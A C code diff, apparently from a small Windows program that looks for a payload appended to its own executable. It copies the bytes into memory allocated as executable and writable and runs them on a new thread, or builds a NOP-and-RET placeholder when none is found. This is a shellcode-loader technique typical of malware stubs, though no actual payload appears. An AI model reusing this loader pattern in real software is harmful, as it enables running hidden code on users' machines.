@@ -50,21 +50,21 @@ int main(int argc, char** argv)
             //printf("Found Payload Start @ 0x%X\n", i);
             myStaticLength = i;
             myPayloadLength = myEXESize - myStaticLength;
-            executeableMem = (UINT8*)VirtualAlloc(0, myPayloadLength - 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            memcpy(executeableMem, myFileBuffer + myStaticLength + 1, myPayloadLength);
-            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)executeableMem, 0, 0, 0);
+            executeableMem = (UINT8*)VirtualAlloc(0, myPayloadLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            memcpy(executeableMem, myFileBuffer + myStaticLength, myPayloadLength);
+            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(executeableMem + 1), 0, 0, 0);
             break;
         }
-    if (myStaticLength == 0)
+    if (myStaticLength == 0) // This is the Soozoo version!
     {
         myStaticLength = myEXESize;
         nextPayloadBuf = (UINT8*)malloc(NextPayloadSize);
         nextPayloadBuf[0] = 0x23;
         for (int i = 1; i < NextPayloadSize - 1; i++)
         {
-            nextPayloadBuf[i] = 0x90;
+            nextPayloadBuf[i] = 0x90; // NOP
         }
-        nextPayloadBuf[NextPayloadSize - 1] = 0xC3;
+        nextPayloadBuf[NextPayloadSize - 1] = 0xC3; // RET
     }
     else
     {
